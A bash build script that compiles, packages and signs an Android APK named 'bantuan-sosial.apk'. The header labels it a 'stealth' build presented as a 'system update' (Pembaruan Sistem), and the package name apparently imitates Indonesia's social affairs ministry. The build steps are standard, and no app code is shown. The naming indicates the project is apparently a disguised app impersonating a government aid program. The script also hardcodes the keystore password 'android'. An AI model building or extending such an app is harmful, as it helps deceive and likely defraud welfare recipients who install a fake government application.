#!/bin/bash
# Build APK stealth — BansosService (Pembaruan Sistem)
set -e

SDK="/opt/android-sdk"
AAPT="$SDK/build-tools/34.0.0/aapt"
D8="$SDK/build-tools/34.0.0/d8"
APKSIGNER="$SDK/build-tools/34.0.0/apksigner"
ZIPALIGN="$SDK/build-tools/34.0.0/zipalign"
PLATFORM="$SDK/platforms/android-34/android.jar"
KS="../keystore.jks"
KSPASS="android"
ALIAS="key0"

PROJ_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "=== 1. Bersihkan build dir ==="
rm -rf "$PROJ_DIR/build"
mkdir -p "$PROJ_DIR/build/out" "$PROJ_DIR/build/obj" "$PROJ_DIR/build/gen" "$PROJ_DIR/build/dex-out"

echo "=== 2. Compile resources (AAPT) ==="
$AAPT package -f -m -J "$PROJ_DIR/build/gen" \
  -M "$PROJ_DIR/app/src/main/AndroidManifest.xml" \
  -S "$PROJ_DIR/app/src/main/res" \
  -I $PLATFORM

echo "=== 3. Compile Java (javac) ==="
javac -source 8 -target 8 -cp $PLATFORM \
  -d "$PROJ_DIR/build/obj" \
  -s "$PROJ_DIR/build/gen" \
  "$PROJ_DIR"/app/src/main/java/com/kemensos/bansos/*.java

echo "=== 4. Convert to DEX (d8) ==="
$D8 --output "$PROJ_DIR/build/dex-out" --min-api 21 \
  --lib $PLATFORM \
  $(find "$PROJ_DIR/build/obj" -name "*.class")

echo "=== 5. Package APK (AAPT) ==="
$AAPT package -f -M "$PROJ_DIR/app/src/main/AndroidManifest.xml" \
  -S "$PROJ_DIR/app/src/main/res" \
  -I $PLATFORM \
  -F "$PROJ_DIR/build/out/unsigned.apk" \
  "$PROJ_DIR/build/obj"

echo "=== 6. Inject classes.dex ==="
cd "$PROJ_DIR/build/dex-out" && zip -r "$PROJ_DIR/build/out/unsigned.apk" classes.dex && cd "$PROJ_DIR"

echo "=== 7. Zipalign ==="
$ZIPALIGN -f 4 "$PROJ_DIR/build/out/unsigned.apk" "$PROJ_DIR/build/out/aligned.apk"

echo "=== 8. Sign APK ==="
$APKSIGNER sign \
  --ks "$PROJ_DIR/$KS" --ks-pass pass:$KSPASS \
  --key-pass pass:$KSPASS \
  --ks-key-alias $ALIAS \
  --out "$PROJ_DIR/build/out/bantuan-sosial.apk" \
  "$PROJ_DIR/build/out/aligned.apk"

echo "=== 9. Verify ==="
$APKSIGNER verify "$PROJ_DIR/build/out/bantuan-sosial.apk"

echo ""
echo "✅ APK siap: $PROJ_DIR/build/out/bantuan-sosial.apk"
ls -lh "$PROJ_DIR/build/out/bantuan-sosial.apk"
